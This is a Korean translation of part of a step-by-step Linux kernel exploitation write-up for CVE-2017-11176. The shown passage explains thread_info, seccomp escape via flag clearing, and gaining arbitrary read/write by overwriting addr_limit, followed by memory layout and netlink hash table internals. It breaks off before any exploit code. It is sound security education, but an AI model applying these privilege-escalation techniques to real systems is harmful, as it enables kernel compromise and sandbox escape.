---
layout: single
title:  "CVE-2017-11176: 한 걸음 한 걸음 리눅스 커널 익스플로잇하기 (part 4/4)"
date:   2019-08-12 15:36:42 +0900
classes: wide
categories: Security
sidebar: 
    nav: "security"
---
*LEXFO의 [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 4/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html)를 번역한 문서입니다. 번역이 애매한 경우엔 원문의 단어를 옆에 적어두었습니다.*

*'retrieve'를 대개 '검색'으로 번역하였는데, 알맞은 단어가 있다면 알려주시기 바랍니다.*

## Introduction

이번 마지막 파트에선 arbitrary call primitive ([part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197) 참고)를 링 0 영역에서의 arbitrary code execution으로 바꾸고 커널을 보수(repair)하여 루트 권한을 취득하려 한다. x86-64 아키텍처의 특정 내용들에 대해 많이 강조할 것이다.

첫 번째로, core concept 섹션은 또 다른 중요 커널 구조 (*thread\_info*)에 초점을 맞춰 익스플로잇의 관점에서 그것이 어떻게 이용될 수 있는지 알아볼 것이다(retrieve *current*, escape seccomp-based sandbox, gain arbitrary read/write). 그리고 가상 메모리의 구성(layout), 커널 스레드 스택과 그것들이 어떻게 *thread\_info*와 연결이 되는지 볼 것이다. 또 리눅스가 어떻게 Netlink를 통해 해시 테이블을 도입했는지(implement) 알아본다.

두 번째로, 우린 유저 영역의 페이로드를 바로(directly) 부르는 것을 시도하고 어떻게 그것이 하드웨어 보호 메커니즘(SMEP)에 의해 차단되는지 보게 될 것이다. 의미있는 정보를 얻기 위해 *page fault exception* 을 어떻게 추적하는지에 대해 광범위하게(extensive) 배운 후 SMEP를 뚫는 여러 방법을 익힐 것이다.

세 번째로, 커널 이미지에서 가젯을 추출하고 왜 우리가 *.text*  섹션을 들여다봐야 하는지 설명할 것이다.  가젯들을 이용하여 stack pivot을 하고 aliasing을 어떻게 다뤄야 하는지 볼 것이다. 가젯에 대한 완화된 제약(relaxed constraints)을 통해 SMEP를 무력화하는 ROP-chain을 도입하고(implement), 스택 프레임과 스택 포인터를 복구할 것이다. 게다가 말끔한 상태(clean state)로 유저 영역의 코드로 돌아갈 것이다(jump to).

네 번째로, 커널 보수(reparation)를 할 것이다. *socket*  dangling pointer를 보수하는 것이 꽤 간단했던 것에 비해, netlink hash list를 보수하는 것은 훨씬 복잡할 것이다. Since the bucket lists are not circular and we lost track of some elements during the reallocation, 트릭과 information leak을 이용하여 보수를 할 것이다.

마지막으로, 익스플로잇 확실성(exploit reliability)에 대해 간단히 배우고(어디서 실패하는지), 익스플로잇의 여러 단계에서의 danger map을 만들 것이다. 그러고 나서 어떻게 루트 권한을 얻는지 볼 것이다.
- - -
## Table of Contents

* Core Concepts #4
* Meeting Supervisor Mode Execution Prevention
* Defeating SMEP Strategies
* Finding Gadgets
* Stack Pivoting
* Debugging the kernel with GDB
* The ROP-Chain
* Repair the Kernel
* Reliability
* Getting root
* Conclusion
* Going Further
- - -
## Core Concepts #4

**주의**: 여기에 나오는 많은 개념은 2016년 중반부터 시작된 중대한 점검(major overhaul)으로 인해 바뀐 **이전 버전에 대한 정보**를 담고 있다. 예를 들어, *thread\_info* 의 몇 몇 필드는 *thread\_struct*(i.e. embedded in task\_struct)로 [이동되었다](https://lore.kernel.org/patchwork/patch/698579/). "이전에 어땠는지"를 아는 것은 "지금 어떤지"를 이해하는데 도움이 된다. 그리고 아직도 많은 시스템에서 "오래된" 커널(4.8.x 미만)을 사용하고 있다.

첫 번째로, 중요한 *thread\_info*  구조체와 그것이 익스플로잇 시나리오에서 어떻게 이용되는지를 알아본다(retrieving current, escaping seccomp, arbitrary read/write).

다음으로, *가상 메모리 맵* 이 어떻게 x86-64 환경에서 조직되어(organized) 있는지 본다. 특히 왜 주소 변환이 64가 아니고 48비트로 제한되는지 보고 "canonical" 주소가 어떤 뜻인지 알아본다.

그리고 커널 스레드 스택에 대해 초점을 맞춰서 그것이 어디서 언제 생성되고, 뭘 담고 있는지 설명할 것이다.

마지막으로, netlink 해시 테이블 자료구조와 연관된 알고리즘에 대해 알아본다. 그걸 이해하는 것이 커널 보수 과정과 익스플로잇 확실성을 높이는 데 도움을 줄 것이다.

### The *thread\_info* Structure

*struct task\_struct* 와 마찬가지로, **struct thread\_info**는 리눅스 커널에서 익스플로잇을 하려면 꼭 이해해야 하는 중요한 구조체이다.

이 구조체는 아키텍처에 좌우된다. x86-64에서의 정의는 다음과 같다:

```c
// [arch/x86/include/asm/thread_info.h]

struct thread_info {
    struct task_struct    *task;
    struct exec_domain    *exec_domain;
    __u32                 flags;
    __u32                 status;
    __u32                 cpu;
    int                   preempt_count;
    mm_segment_t          addr_limit;
    struct restart_block  restart_block;
    void __user           *sysenter_return;
#ifdef CONFIG_X86_32
    unsigned long         previous_esp;
    __u8                  supervisor_stack[0];
#endif
    int                   uaccess_err;
};
```

제일 중요한 필드는 다음의 필드들이다:

* **task**: 이 *thread\_info* 에 연결된 *task\_struct* 에 대한 포인터 (다음 섹션 참고)
* **flags**: *\_TIF\_NEED\_RESCHED* 나 *\_TIF\_seccomp* 와 같은 flag를 담고 있음 (Escaping Seccomp-Based Sandbox 섹션 참고)
* **addr\_limit**: 유저 영역 가상 주소 중에 커널 시점에서 "제일 높은" 주소. "소프트웨어 보호 메커니즘"에서 사용. (Gaining Arbitrary Read/Write 섹션 참고)

이제 익스플로잇 시나리오에서 각각의 필드를 어떻게 이용할 수 있는지 보자.

#### Using Kernel Thread Stack Pointer

일반적으로 *task\_struct*  포인터에 접근할 수 있게 되면 역참조 포인터(dereferencing pointers)를 통해  다른 여러 커널 구조체를 검색(retrieve)할 수 있다. 예를 들어 우리는 커널 보수 과정에서 *file descripter table* 의 주소를 찾는데 이를 활용할 것이다.

*task*  필드가 자신과 연관된 *task\_struct* 를 가리키고 있으므로, *current* 를 검색하는 것은(Core Concepts #1이 기억나는가?) 다음과 같이 간단하다:

```c
#define get_current() (current_thread_info()->task)
```

문제는 현재(current) *thread\_info* 의 주소를 어떻게 얻느냐는 것이다.

우리가 커널 "스레드 스택" 내의 포인터를 가지고 있다고 가정하면, 현재 *thread\_info*  포인터를 다음과 같이 검색할 수 있다:

```c
#define THREAD_SIZE (PAGE_SIZE << 2)
#define current_thread_info(ptr) (_ptr & ~(THREAD_SIZE - 1))

struct thread_info *ti = current_thread_info(leaky_stack_ptr);
```

이것이 작동하는 이유는 *thread\_info* 가 커널 스레드 스택 안에 있기 때문이다("Kernel Stacks" 섹션을 보라).

반대로 *task\_struct* 에 대한 포인터를 가지고 있다면, *task\_struct*  안의 **stack** 필드를 통해 현재 *thread_info* 를 검색할 수 있다.

즉, 둘 중 하나의 포인터를 가지고 있다면 다른 구조체를 검색할 수 있다는 것이다.

![이미지 이름 테스트](https://blog.lexfo.fr/images/cve-2017-11176-linux/task_thread_thread_info.png)

*task\_struct* 의 *stack*  필드가 (커널 스레드) 스택의 제일 높은 부분이 아닌 *thread\_info* 를 가리킨다는 점에 유의하자!

#### Escaping Seccomp-Based Sandbox

요즘은 컨테이너나 샌드박스를 이용하는 프로그램이 더욱 넓게 퍼지고 있다. 때로는 커널 익스플로잇만이 그런 프로그램을 뚫는 유일한 (혹은 가장 간단한) 방법이다.

리눅스 커널의 seccomp는 프로그램이 syscall에 접근하는 것을 제한하도록 해주는 시설(facility)이다. syscall은 완전히 금지되거나(호출이 불가능) 부분적으로 금지될 수 있다(파라미터가 필터링됨). seccomp는 **seccomp filters**라 불리는 BPF 룰을 이용하여 설정된다(setup).

한번 적용된 seccomp filters는 "평범한" 방법으로 비활성화시킬 수 없다. API가 syscall이 존재하지 않는 것처럼 강제한다.

seccomp를 이용하는 프로그램이 시스템 콜을 호출하면(make), 커널은 *thread\_info* 의 플래그 중 *\_TIF\_WORK\_SYSCALL\_ENTRY*  플래그가 설정되어 있는지 확인한다. 만약 그렇다면 커널은 **syscall\_trace\_enter** 경로를 따른다. 맨 처음에 **secure\_computing()**함수가 호출된다:

```c
long syscall_trace_enter(struct pt_regs *regs)
{
    long ret = 0;

    if (test_thread_flag(TIF_SINGLESTEP))
        regs->flags |= X86_EFLAGS_TF;

    /* do the secure computing check first */
    secure_computing(regs->orig_ax);            // <----- "rax" holds the syscall number

  // ...
}

static inline void secure_computing(int this_syscall)
{
    if (unlikely(test_thread_flag(TIF_SECCOMP)))      // <----- check the flag again
        __secure_computing(this_syscall);
}
```

이 부분을 지나면 seccomp에 대해선 설명하지 않을 것이다. 요약하자면, syscall이 금지되어 있을 땐 잘못된(faulty) 프로세스에게 SIGKILL 시그널이 전달된다.

중요한 것은 현재 구동되는 스레드의 ***TIF\_SECCOMP*  플래그를 해제하는 것**이 seccomp 검사를 비활성화하는 데 "충분"하다는 것이다.

**주의**: 이는 오직 "현재의" 스레드에만 적용되는 사실이다. 포크하거나 execve를 사용하면(forking/execve'ing) seccomp가 다시 활성화된다(*task\_struct* 를 볼 것).

#### Gaining Arbitrary Read/Write

이제 *thread\_info*  필드의 **addr\_limit**필드를 보자.

여러 시스템 콜 implementation을 보면, 맨 처음에 유저 영역의 데이터를 커널 영역으로 가져오기 위해 **copy\_from\_user** 함수를 호출하는 것이 대부분인 것을 알 수 있다. 그걸 실패하면 *time-of-check time-of-use (TOCTOU)*  버그로 이어질 수 있다 (e.g. 이미 체크된 유저 영역 값을 변경).

비슷한 방식으로 시스템 콜 코드는 커널 영역 데이터를 유저 영역으로 옮기기 위해 **copy\_to\_user()**함수를 호출해야 한다.

```c
long copy_from_user(void *to,   const void __user * from, unsigned long n);
long copy_to_user(void __user *to, const void *from, unsigned long n);
```

**노트**: *\_\_user*  매크로는 아무 것도 하지 않는다. 이는 그저 커널 개발자들에게 이 데이터가 유저 영역 메모리를 가리키는 포인터라는 힌트를 줄 뿐이다. 덧붙여, [sprase](https://lwn.net/Articles/689907/)같은 툴을 이용하면 매크로를 통해 이익을 얻을 수 있다(can benefit from it).

*copy\_from\_user()* 와 *copy\_to\_user()*  모두 아키텍처에 따라 달라지는 함수이다. x86-64 아키텍처에선 *arch/x86/lib/copy_user* 에 구현(implement)되어 있다.

**노트**: 어셈블리 코드를 읽기 싫다면 *include/asm-generic/\**에 있는 **generic**한 아키텍처가 있다. 보면 아키텍처에 좌우되는 함수가 "뭘 해야 하는지"를 이해하는데 도움이 될 것이다.

*copy\_from\_user*  함수의 *generic*한(x86-64가 아니다) 코드는 다음과 같은 모습이다:

```c
// from [include/asm-generic/uaccess.h]

static inline long copy_from_user(void *to,
        const void __user * from, unsigned long n)
{
    might_sleep();
    if (access_ok(VERIFY_READ, from, n))
        return __copy_from_user(to, from, n);
    else
        return n;
}
```

"소프트웨어" 접근 권한 체크는 *\_\_copy\_from\_user*  가 *from*에서 *to*로 *n* 바이트를 무조건적으로(unconditionally) 옮기는 동안 *access\_ok()*에서 수행된다. 다시 말해 파라미터가 체크되지 않은 상태인데 *\_\_copy\_from\_user()*를 보게 된다면 심각한 보안 취약점이 있는 것이다. 다시 x86-64 아키텍처로 넘어가자.

실제 사본을 실행하기 전에, **\_\_user**로 마킹된(marked) 파라미터가 현재 *thread\_info* 의 *addr\_limit* 값과 비교하여(against)(?) 체크된다. 만일 범위(from+n)가 *addr\_limit* 보다 아래라면 사본이 실행되고, 그렇지 않은 경우 *copy\_from\_user()* 는 에러를 나타내는 null이 아닌 값을 반환한다.

*addr\_limit* 값은 각각 **set\_fs()**와 **get\_fs()** 매크로를 통해 설정되고 검색된다:

```c
#define get_fs()    (current_thread_info()->addr_limit)
#define set_fs(x)   (current_thread_info()->addr_limit = (x))
```

예를 들어 **execve()** syscall을 사용한다면 커널은 알맞은 "binary loader"를 찾으려 한다. 만약 바이너리가 ELF 형식이라면 *load\_elf\_binary()*  함수가 실행되고 **start\_thread()**함수를 호출하며 종료된다:

```c
      // from [arch/x86/kernel/process_64.c]

      void start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)
      {
        loadsegment(fs, 0);
        loadsegment(es, 0);
        loadsegment(ds, 0);
        load_gs_index(0);
        regs->ip        = new_ip;
        regs->sp        = new_sp;
        percpu_write(old_rsp, new_sp);
        regs->cs        = __USER_CS;
        regs->ss        = __USER_DS;
        regs->flags     = 0x200;
        set_fs(USER_DS);                        // <-----
        /*
         * Free the old FP and other extended state
         */
        free_thread_xstate(current);
      }
```

*start\_thread*  함수는 현재 *thread\_info*의 *addr\_limit*를 다음과 같이 정의된 **USER_DS**로 재설정한다.

```c
#define MAKE_MM_SEG(s)  ((mm_segment_t) { (s) })
#define TASK_SIZE_MAX   ((1UL << 47) - PAGE_SIZE)
#define USER_DS     MAKE_MM_SEG(TASK_SIZE_MAX)
```

즉 유저 영역 주소는 **0x7ffffffff000** (32비트에선 0xc0000000) 아래일 때 유효하다.

이미 눈치 챘을 수도 있겠지만 ***addr\_limit* 값을 덮어씌우는 것은 arbitrary read/write primitive**로 이어질 수 있다. 다음과 같은 것을 해주는 것이 있다면 이상적이다:

```c
#define KERNEL_DS   MAKE_MM_SEG(-1UL)   // <----- 0xffffffffffffffff
set_fs(KERNEL_DS);
```

이걸 해낸다면 **소프트웨어 보호 메커니즘을 무력화시킨 것이다.** 다시 강조하지만 이는 "소프트웨어"에 한정된다! 하드웨어 보호는 여전히 켜져있고, 유저 영역에서 바로 커널 메모리로 접근하는 것은 익스플로잇을 종료(SIGSEGV)시키는 page fault를 유발할 것이다. 이는 실행 레벨이 여전히 CPL=3이기 때문이다("page fault" 섹션을 볼 것).

우린 유저 영역에서 커널 메모리를 읽거나 쓰고 싶다. 따라서 우린 **"\_\_user"라고 마킹된 파라미터를 통해 커널 포인터를 제공하며**   *copy\_{to|from}\_user()*함수를 호출하는 syscall을 이용하여 커널에게 원하는 일을 해달라고 요청해야 한다.

#### Final note about *thread\_info*

여기서 보여준 세 가지 예시를 통해 알 수 있었듯, *thread_info*  구조체는 일반적으로도, 익스플로잇 시나리오에 있어서도 아주 중요하다. 우리는 다음과 같은 내용들을 볼 수 있었다:

1. 커널 스레드 스택 포인터를 leak할 때 현재 *task\_struct* 에 대한 포인터를 얻을(retrieve) 수 있다.
2. *flags* 필드를 덮어씌우면 seccomp protection을 무력화시켜 최종적으로 sandbox를 뚫을(escape) 수 있다.
3. *addr\_limit*  필드의 값을 바꿈으로써 arbitrary read/write primitive를 얻을 수 있다.

이것들은 그저 *thread\_info*로 할 수 있는 것 중 일부일 뿐이다. 작지만 치명적인 구조체가 아닐 수 없다.

### Virtual Memory Map

이전 섹션에서 유저 영역의 유효한 주소 중 "가장 높은" 주소가 뭔지 확인하였다:

```c
#define TASK_SIZE_MAX   ((1UL << 47) - PAGE_SIZE) // == 0x00007ffffffff000
```

이 "47"이라는 숫자는 어디서 온 걸까?

AMD64 아키텍처 초기에 설계자들은 주소가 2^64인 메모리는 "너무 크고" 강제로 페이지 테이블의 level(performance hit)을 늘린다고 생각하였다. 이런 이유로 인해 가상 주소를 물리 주소로 바꿀 땐 제일 낮은 48비트만을 사용하는 것으로 결정되었다.

유저 영역의 주소 공간의 범위가 0x0000000000000000부터 0x00007ffffffff000까지라면 커널 주소 공간은 어떨까? 정답은 0xffff800000000000부터 0xffffffffffffffff까지이다.

즉 [48:63]의 비트는 다음과 같다:

* 유저 영역을 위해 다 비어있음
* 커널 영역을 위해 다 차있음

더 정확히 말해서, AMD는 이 [48:63]이 47비트와 같다고 해두었다(imposed). 그렇지 않으면 예외가 발생한다. 이 관습을 따르는 주소를 **canonical form addresses**라고 부른다. 이 방식으로 256TB의 메모리도 address할 수 있다(반은 유저, 반은 커널).

0x00007ffffffff000과 0xffff800000000000 사이의 공간은 **unused memory addresses**이다("non-canonical addresses"라고도 불린다). 즉 64비트 프로세스의 가상 메모리 레이아웃은 다음과 같다:

![virtual memory layout for a 64-bit process](https://blog.lexfo.fr/images/cve-2017-11176-linux/virtual_memory_map.png)

위의 구성도는 "큰 그림"이다. 리눅스 커널 문서에서 더 정확한 가상 메모리 맵을 볼 수 있다: *Documentation/x86/x86\_64/mm.txt*

**노트**: "guard hole" 주소 범위는 몇 몇 하이퍼바이저(Xen 등)에게 필요하다.

이제 "0xffff8" 혹은 그보다 높은 값으로 시작하는 주소를 보면, 그것이 커널의 주소라는 것을 알 수 있게 됐다.

### Kernel Thread Stacks

리눅스(x86-64 아키텍처)엔 두 종류의 커널 스택이 있다:

* **thread stacks**: 모든 active 스레드를 위한 16kb의 스택
* **specialized stacks**: 특수한 작업에서 쓰이는 *cpu별*(per-cpu)  스택 여럿

다음의 리눅스 커널 문서를 통해 더 많은 보충 정보를 읽어볼 수 있다:
*Documentation/x86/x86\_64/kernel-stacks*

첫 번째로, *스레드 스택* 에 대해 얘기해보자. 새로운 스레드가 만들어지면 커널은 **copy\_process()** 함수를 호출함으로써 "포크하는 것과 비슷한" 작업을 수행한다. 나중에 생긴 것이 새로운 *task\_struct*를 할당하고 부모의 *task\_struct*의 대부분을 새것에 복사한다.

그러나 task가 어떻게 생성되었냐에 따라 몇 몇 리소스는 공유될 수도 있고(e.g. memory is shared in a multithreaded application) "복사"될 수도 있다(e.g. the libc's data). 후자의 경우에 스레드가 몇 몇 데이터를 수정하면 새 분리된(seperated) 버전이 생성되고, 이를 **copy-on-write**라 부른다(i.e. it impacts only the current thread and not every thread importing the libc).

다시 말해 프로세스는 절대 "밑바닥부터"(from scratch) 생성되는 것이 아니고 부모 프로세스를 복사하여 만들어지는 것이다. 부모 프로세스와의 "차이점"은 이후에 반영된다.

게다가, 스레드마다 다른(thread specific) 데이터도 있는데 그들 중 하나가 커널 스레드 스택이 된다(?). 프로세스의 생성/복제 과정에서 *dup\_task\_struct()*  함수는 아주 초반에 호출된다:

```c
      static struct task_struct *dup_task_struct(struct task_struct *orig)
      {
        struct task_struct *tsk;
        struct thread_info *ti;
        unsigned long *stackend;
        int node = tsk_fork_get_node(orig);
        int err;

        prepare_to_copy(orig);

[0]     tsk = alloc_task_struct_node(node);
        if (!tsk)
          return NULL;

[1]     ti = alloc_thread_info_node(tsk, node);
        if (!ti) {
          free_task_struct(tsk);
          return NULL;
        }

[2]     err = arch_dup_task_struct(tsk, orig);
        if (err)
          goto out;

[3]     tsk->stack = ti;

        // ... cut ...

[4]     setup_thread_stack(tsk, orig);

        // ... cut ...
      }

      #define THREAD_ORDER  2

      #define alloc_thread_info_node(tsk, node)             \
      ({                                    \
        struct page *page = alloc_pages_node(node, THREAD_FLAGS,    \
                     THREAD_ORDER);     \
        struct thread_info *ret = page ? page_address(page) : NULL; \
                        \
        ret;                                \
      })
```

이 코드는 다음과 같은 일을 수행한다:

* **[0]**: Slab allocator를 사용하여 새 *struct task\_struct* 를 할당한다.
* **[1]**: Buddy allocator를 사용하여 **새 스레드 스택을 할당한다.**
* **[2]**: *orig*  task\_struct의 내용을 새 *tsk*  task\_struct에 복사한다(차이점은 이후에 반영된다).
* **[3]**: *task\_struct* 의 *스택*  포인터를 **ti**로 바꾼다. 새 스레드는 이제 전용 스레드 스택과 **자체 *thread\_info* 를** 가진다(?).
* **[4]**: *orig* 의 *thread_info* 에 있는 내용을 새 *tsk* 의 *thread_info* 로 복사하고 *task* 필드를 고정(fixes)한다.

[1]이 혼란스러울 수 있다. *alloc\_thread\_info\_node()*  매크로는 *struct thread\_info* 를 할당해야 하지만 스레드 스택을 할당한다. 이는 ***thread\_info*  구조체가 thread stack 안에 있기 때문이다**:

```c
#define THREAD_SIZE  (PAGE_SIZE << THREAD_ORDER)

union thread_union {                                // <----- this is an "union"
    struct thread_info thread_info;
    unsigned long stack[THREAD_SIZE/sizeof(long)];  // <----- 16k-bytes
};
```

*init*  process를 제외하면 *thread\_union* 은 사용되지 않는다(x86-64에서). 하지만 레이아웃은 동일하다:

![Thread Stack Layout](https://blog.lexfo.fr/images/cve-2017-11176-linux/thread_stack.png)

**노트**: *KERNEL\_STACK\_OFFSET* 은 "최적화를 위해" 존재한다(몇 몇 경우에 sub operation을 안 쓰게 해준다). 지금은 무시해도 된다.

*STACK\_END\_MAGIC* 은 커널 스레드 스택 오버플로우 익스플로잇을 완화(mitigate)하기 위해 있다. 앞서 설명한 것처럼 *thread\_info*의 데이터를 덮어씌우면 끔찍한 일이 벌어질 수 있다(*restart\_block*  필드에 함수 포인터도 들어있다).

*thread\_info* 가 제일 위에 있는 것을 통해 어떻게 어떤 *커널 스레드 스택*  포인터에서든*THREAD\_SIZE* 를 마스킹하여(by masking out)(?) *thread\_info*  주소를 얻을 수 있는지 알 수 있다.

위 도표를 보면 **kernel\_stack** 포인터가 있는데, 이것은 "cpu별"(per-cpu) 변수이다. 다음과 같이 선언되어 있다:

```c
// [arch/x86/kernel/cpu/common.c]

DEFINE_PER_CPU(unsigned long, kernel_stack) =
    (unsigned long)&init_thread_union - KERNEL_STACK_OFFSET + THREAD_SIZE;
```

처음에 *kernel\_stack* 은 *init*  스레드 스택(=*init\_thread\_union*)을 가리키고 있다. 그러나 이 (cpu별) 변수는 문맥 전환 중에 업데이트된다:

```c
#define task_stack_page(task)   ((task)->stack)

__switch_to(struct task_struct *prev_p, struct task_struct *next_p)
{
  // ... cut ..

    percpu_write(kernel_stack,
          (unsigned long)task_stack_page(next_p) +
          THREAD_SIZE - KERNEL_STACK_OFFSET);

  // ... cut ..
}
```

마침내 *current thread\_info* 는 다음을 통해 얻는다:

```c
static inline struct thread_info *current_thread_info(void)
{
    struct thread_info *ti;
    ti = (void *)(percpu_read_stable(kernel_stack) +
              KERNEL_STACK_OFFSET - THREAD_SIZE);
    return ti;
}
```

** *kernel_stack* 포인터는 시스템 콜에 진입할 때 이용된다. 시스템 콜을 종료할 때 복구되는 현재(current) (유저 영역의) *rsp* 를 대신한다.

### Understanding Netlink Data Structures

netlink 데이터 구조를 자세히 살펴보자. 우리가 보수하려는(repair) dangling pointers가 어떤 것이고 어디에 있는지 이해하는 데 도움이 될 것이다.

Netlink는 *netlink\_table*에 "전역" 배열 **nl_table**을 가지고 있다:

```c
// [net/netlink/af_netlink.c]

struct netlink_table {
    struct nl_pid_hash hash;        // <----- we will focus on this
    struct hlist_head mc_list;
    unsigned long *listeners;
    unsigned int nl_nonroot;
    unsigned int groups;
    struct mutex *cb_mutex;
    struct module *module;
    int registered;
};

static struct netlink_table *nl_table;  // <----- the "global" array
```

*nl\_table* 배열은 *netlink\_proto\_init()*을 통해 *부팅 시간에*  초기화된다:

```c
// [include/linux/netlink.h]

#define NETLINK_ROUTE       0   /* Routing/device hook              */
#define NETLINK_UNUSED      1   /* Unused number                */
#define NETLINK_USERSOCK    2   /* Reserved for user mode socket protocols  */
// ... cut ...
#define MAX_LINKS 32        

// [net/netlink/af_netlink.c]

static int __init netlink_proto_init(void)
{
  // ... cut ...

    nl_table = kcalloc(MAX_LINKS, sizeof(*nl_table), GFP_KERNEL);

  // ... cut ...
}
```

다시 말해서 **한 프로토콜에 하나의 *netlink\_table***이 있다 (*NETLINK\_USERSOCK* 이 그 중 하나이다). 게다가 각각의 netlink table은 *struct nl\_pid\_hash*  타입의 **hash** 필드를 포함하고 있다.

```c
// [net/netlink/af_netlink.c]

struct nl_pid_hash {
    struct hlist_head *table;
    unsigned long rehash_time;

    unsigned int mask;
    unsigned int shift;

    unsigned int entries;
    unsigned int max_shift;

    u32 rnd;
};
```

이 구조는 **netlink hash table**을 다루는 데 사용된다. 이를 위해 다음의 필드들이 사용된다:

* *table*: *hlist\_head*의 배열. **해시 테이블** 그 자체.
* *reshash\_time*: "dilution"의 수를 시간이 지날수록 줄이는 데 사용된다.
* *mask*: buckets의 수(마이너스 1), 해시 함수의 결과를 mask하는 데 쓰인다(?)
* *shift*: elements 수의 "평균"을 계산하는 데 쓰이는 비트들. 해시 테이블이 크는(grown) 시간을 나타낸다.
* *entries*: 해시 테이블 안 element의 총 개수
* *max\_shift*: 테이블이 커지는(grown) 시간의 최대치를 나타내는 비트들. 즉 buckets의 최대 개수를 나타낸다.
* *rnd*: 해시 함수에 의해 쓰이는 난수

netlink 해시 테이블 이야기로 돌아가기 전에 리눅스의 해시 테이블 API를 훑어보도록 하자.

### Linux Hash Table API

해시 테이블은 **struct hlist\_head**나 **struct hlist\_node**와 같은 전형적인(typical) 리눅스 데이터 구조와 함께 다뤄진다. 리스트의 헤드와 요소들을 나타내기 위해 같은 타입을 썼던 *struct list\_head*와는 다르게("Core Conceps #3" 참고), 해시 리스트는 다음과 같이 정의된 두 타입을 사용한다:

```c
// [include/linux/list.h]

/*
 * Double linked lists with a single pointer list head.
 * Mostly useful for hash tables where the two pointer list head is
 * too wasteful.
 * You lose the ability to access the tail in O(1).       // <----- this
 */

struct hlist_head {
    struct hlist_node *first;
};

struct hlist_node {
    struct hlist_node *next, **pprev; // <----- note the "pprev" type (pointer of pointer)
};
```

그러므로 해시 테이블은 하나 혹은 여러 bucket들로 구성되어 있다. 주어진 bucket에 있는 각각의 요소는 **원형이 아닌** 이중 연결 리스트 형태이다. 이는 다음을 의미한다:

* bucket의 마지막 요소는 NULL을 가리킨다.
* bucket list에 있는 첫 번째 요소의 *pprev*  포인터는 *hlist\_head* 의 *첫 번째*  포인터를 가리키고 있다(이중 포인터이다).

bucket 자체는 **포인터 하나**를 가진 *hlist\_head* 로 나타난다(represent). 다시 말해, **bucket의 head에서는 bucket의 tail에 접근할 수 없다**.
리스트를 전부 지나가야 한다(cf. the commentary).

마지막으로 전형적인(typical) 해시 테이블은 이렇게 생겼다:

![Typical Hashtable](https://blog.lexfo.fr/images/cve-2017-11176-linux/typical_hashtable.png)

사용 예시를 보고 싶다면 이 [FAQ](https://kernelnewbies.org/FAQ/Hashtables)(kernelnewbies.org 출처)를 보면 된다.

### Netlink Hash Tables Initialization

Netlink의 해시 테이블 초기화 코드를 두 파트로 나눠서 보자.

첫 번째로, **order** 값이 전역 변수 **totalram\_pages**를 가지고 계산된다. **totalram\_pages**는 부팅 시간에 계산되고, 이름처럼 RAM에서 쓸 수 있는 페이지 프레임의 수를 (대략적으로) 나타낸다. 예를 들어 512MB 시스템이라면 *max\_shift* 는 16 정도 될 것이다(해시 테이블마다 65k buckets).

두 번째로, **모든 netlink 프로토콜에 각기 다른 해시 테이블이 생성된다**:

```c
      static int __init netlink_proto_init(void)
      {
        // ... cut ...

        for (i = 0; i < MAX_LINKS; i++) {
          struct nl_pid_hash *hash = &nl_table[i].hash;

[0]       hash->table = nl_pid_hash_zalloc(1 * sizeof(*hash->table));
          if (!hash->table) {
            // ... cut (free everything and panic!) ...
          }
          hash->max_shift = order;
          hash->shift = 0;
[1]       hash->mask = 0;
          hash->rehash_time = jiffies;
        }

        // ... cut ...
      }
```

[0]에서 해시 테이블은 **단 하나의 bucket**을 할당받는다. [1]에서 *mask* 가 0으로 설정된다(bucket의 수 - 1). *hash->table*  필드는 각자 bucket list의 head를 가리키고 있는 *struct hlist\_head*  의 배열이라는 것을 기억하자.

### Basic Netlink Hash Table Insertion

이제 netlink 해시 테이블의 초기 상태가 어떤지 알게 됐다(bucket 하나만 있는 것). 이제 **netlink\_insert()**로 시작하는 삽입 알고리즘을 배워보자. 이 섹션에선 "기본적인"(basic) 경우만을 고려한다("dilute" 메커니즘은 무시한다).

*netlink\_insert()*의 목적은 인자로 제공된 *pid*를 이용하여 해시 테이블에 *sock*의 *hlist\_node*를 삽입하는 것이다. ***pid*는 한 해시 테이블에 하나만 나올(appear) 수 있다.**

첫 번째로, *netlink\_insert()*  함수의 시작 부분을 보자:

```c
      static int netlink_insert(struct sock *sk, struct net *net, u32 pid)
      {
[0]     struct nl_pid_hash *hash = &nl_table[sk->sk_protocol].hash;
        struct hlist_head *head;
        int err = -EADDRINUSE;
        struct sock *osk;
        struct hlist_node *node;
        int len;

[1a]    netlink_table_grab();
[2]     head = nl_pid_hashfn(hash, pid);
        len = 0;
[3]     sk_for_each(osk, node, head) {
[4]       if (net_eq(sock_net(osk), net) && (nlk_sk(osk)->pid == pid))
            break;
          len++;
        }
[5]     if (node)
          goto err;

        // ... cut ...

      err:
[1b]    netlink_table_ungrab();
        return err;
      }
```

위의 코드는 다음을 수행한다:

* **[0]**: 주어진 프로토콜(예 : *NETLINK\_USERSOCK*)의 *nl\_pid\_hash* (i.e. hash table)를 얻는다.
* **[1a]**: 모든 netlink hash table에 대한 접근을 잠금으로 보호한다.
* **[2]**: \pid 인자를 해시 함수의 키로 사용하여 bucket에 대한 포인터(i.e. a *hlist\_head*)를 얻는다.
* **[3]**: bucket의 이중 연결 리스트를 순회하고...
* **[4]**: ... *pid*  충돌을 체크한다.
* **[5]**: bucket의 리스트에 *pid*가 발견되면 *err*로 점프한다. *-EADDRINUSE*  에러를 반환할 것이다.
* **[1b]**: netlink hash table 잠금을 해제한다.

[2]를 제외하면 꽤 간단하다. 알맞은 bucket을 찾고 *pid*가 이미 존재하지 않는지 체크하는 것이다.

다음은 몇 가지 sanity check이다:

```c
        err = -EBUSY;
[6]     if (nlk_sk(sk)->pid)
          goto err;

        err = -ENOMEM;
[7]     if (BITS_PER_LONG > 32 && unlikely(hash->entries >= UINT_MAX))
          goto err;
```

[6]에서 *netlink\_insert()*  코드는 해시 테이블에 삽입되고 있는 *sock* 이 *pid* 세트를 이미 가지고 있지 않다는 것을 확실하게 한다. 다시 말해서 이미 해시 테이블에 삽입되어 있는 건 아닌지 확인하는 것이다. [7]에서 하는 체크는 그냥 *hard limit*이다. Netlink 해시 테이블은 4기가 개 이상의 요소를 가질 수 없다(4기가도 많다!).

마지막은 다음과 같다:

```c
[8]     if (len && nl_pid_hash_dilute(hash, len))
[9]       head = nl_pid_hashfn(hash, pid);
[10]    hash->entries++;
[11]    nlk_sk(sk)->pid = pid;
[12]    sk_add_node(sk, head);
[13]    err = 0;
```

위 코드는 다음을 수행한다:

